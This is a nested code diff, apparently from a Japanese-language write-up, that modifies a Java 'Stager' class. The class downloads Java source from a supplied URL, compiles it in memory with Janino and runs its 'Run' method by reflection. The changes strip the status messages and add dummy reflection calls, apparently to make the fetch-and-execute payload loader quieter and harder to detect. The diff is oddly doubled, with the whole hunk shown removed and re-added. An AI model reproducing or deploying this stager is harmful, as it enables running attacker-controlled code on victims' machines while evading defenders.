@@ -58,55 +58,55 @@ index fd7eb94..5d48b06 100644
 --- a/src/main/java/Stager.java
 +++ b/src/main/java/Stager.java
 @@ -60,45 +60,40 @@ public class Stager {
-         
-         // Check how many arguments were passed in
-         if (args.length != 1) {
--            System.out.println("Proper Usage is: java -jar JavaStager-0.1-initial.jar <url>");
-             System.exit(0);
-         }
- 
-         // if we get here then a parameter was provided.
-         String u = args[0];
--        System.out.println("[*] URL provided: " + u);
- 
-         try {
- 
-             // URL for java code
-+            Method meth = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
-             URL payloadServer = new URL(u);
- 
-             URLConnection yc = payloadServer.openConnection();
--            BufferedReader in = new BufferedReader(new InputStreamReader(
--                    yc.getInputStream()));
-+            Method meth2 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
-+            BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
- 
-             // Download code into memory
-             String inputLine;
-             StringBuffer payloadCode = new StringBuffer();
-+            Method meth3 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
-             while ((inputLine = in.readLine()) != null) {
-                 payloadCode.append(inputLine + "\n");
-             }
--            System.out.println("[*] Downloaded payload");
-             
-             // Compile it using Janino
--            System.out.println("[*] Compiling ....");
-             SimpleCompiler compiler = new SimpleCompiler();
-             compiler.cook(new StringReader(payloadCode.toString()));
-             Class<?> compiled = compiler.getClassLoader().loadClass("Payload") ;
- 
-             // Execute "Run" method using reflection
--            System.out.println("[*] Executing ....");
-             Method runMeth = compiled.getMethod("Run");
-             // This form of invoke works when "Run" is static
-             runMeth.invoke(null); 
-             
--            System.out.println("[*] Payload, payloading ....");
--
-             in.close();
-         } catch (Exception ex) {
-             ex.printStackTrace();
+
+         // Check how many arguments were passed in
+         if (args.length != 1) {
+-            System.out.println("Proper Usage is: java -jar JavaStager-0.1-initial.jar <url>");
+             System.exit(0);
+         }
+ 
+         // if we get here then a parameter was provided.
+         String u = args[0];
+-        System.out.println("[*] URL provided: " + u);
+ 
+         try {
+ 
+             // URL for java code
++            Method meth = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
+             URL payloadServer = new URL(u);
+ 
+             URLConnection yc = payloadServer.openConnection();
+-            BufferedReader in = new BufferedReader(new InputStreamReader(
+-                    yc.getInputStream()));
++            Method meth2 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
++            BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
+ 
+             // Download code into memory
+             String inputLine;
+             StringBuffer payloadCode = new StringBuffer();
++            Method meth3 = Class.forName("java.io.BufferedReader").getMethod("readLine", new Class[0]);
+             while ((inputLine = in.readLine()) != null) {
+                 payloadCode.append(inputLine + "\n");
+             }
+-            System.out.println("[*] Downloaded payload");
+             
+             // Compile it using Janino
+-            System.out.println("[*] Compiling ....");
+             SimpleCompiler compiler = new SimpleCompiler();
+             compiler.cook(new StringReader(payloadCode.toString()));
+             Class<?> compiled = compiler.getClassLoader().loadClass("Payload") ;
+ 
+             // Execute "Run" method using reflection
+-            System.out.println("[*] Executing ....");
+             Method runMeth = compiled.getMethod("Run");
+             // This form of invoke works when "Run" is static
+             runMeth.invoke(null); 
+             
+-            System.out.println("[*] Payload, payloading ....");
+-
+             in.close();
+         } catch (Exception ex) {
+             ex.printStackTrace();
 ```
 
 ビルド
